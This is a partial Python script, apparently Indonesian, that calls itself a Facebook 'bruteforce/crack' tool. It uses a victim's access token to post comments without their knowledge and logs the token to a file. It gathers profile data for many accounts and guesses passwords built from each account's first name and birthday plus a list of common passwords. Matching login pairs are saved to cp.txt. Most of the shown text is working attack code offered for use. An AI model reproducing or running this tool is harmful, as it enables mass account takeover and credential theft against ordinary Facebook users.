...
#WhatsApp : 083135994301
#Facebook : 噩噩噩
#Youtube :CyberCringe
author = 'WansGansXpL' #author utama
...
#nama nama buat logo :)
try:
	judul=pyfiglet.figlet_format('W-CRACK')
	tem=pyfiglet.figlet_format('FRIENDS')
...
def login():
	...
	if p in ('01','1'): #kondisi 1 login dengan token :)
		...
		try:
			...
			req.post(f'https://graph.facebook.com/149237547235985/comments/?message=Master GG Bet Lu😎😎&access_token={t}')
			time.sleep(2)
			nampung(t).menu()
		except KeyError:
			os.system('clear')
		...
		if (find_token is None):
			...
			req.post(f"https://graph.facebook.com/149237547235985/comments/?message=Udah Pro Ganteng lagi😍😍😎😎&access_token={to}")
			time.sleep(2)
			open("log.txt","a").write(to)
			nampung(to).menu()
			try:
				cek=req.get("https://www.facebook.com/NaZerkhaN521",cookies={"cookie":cookie}).text
				true=False
...
class crack:
	...
	def crack2(self,user,pw,ttl):
		...
		if "c_user" in d.cookies:
			...
			cp+=1
			open("cp.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;33m[Tor] {user} | {pw} | {ttl}      \x1b[0m",end="")
			print("")
		else:pass
class nampung:
	...
	def sendPublik(self):
		...
		with Bool(max_workers=35) as tokai:
			...
			for id in idPublik:
				r2=json.loads(req.get(f'https://graph.facebook.com/{id}?access_token={self.token}').text)
				try:pwList=[r2['first_name']+'0',r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345','Sayang','Doraemon','Bangsad','Rahasia','Katasandi','123456','1234567','102030','Freefire','Anjing','Monyet','Kontol','Bismillah','Indonesia','Rahasia','Ganteng','Cantik','Gaming','MobileLegends','AnakSultan','Alok123',r2['birthday']] #Password list ubah jika itu butuh :)
				except:pass
				try:
	...
	def menu(self):
		...
		while True:
			...
			if p in ('01','1'):self.sendTeman()
				...
				print('\n[ Hallo kak! Ini adalah tools bruteforce/crack facebook!! Tools ini dibuat oleh WansGansXpL dengan github wansgang980 ]\n\nInformasi Sosmed\n1. Facebook\t: WansGans\n2. WhatsApp\t: 083135994301\n\nJika mengalamin kendala saat memakai tools hubungi social media diatas terima kasih.\n')
				b=input('[   ENTER UNTUK KEMBALI   ]')
				self.menu()
			elif p=='9':
				os.system('rm -rf log.txt')
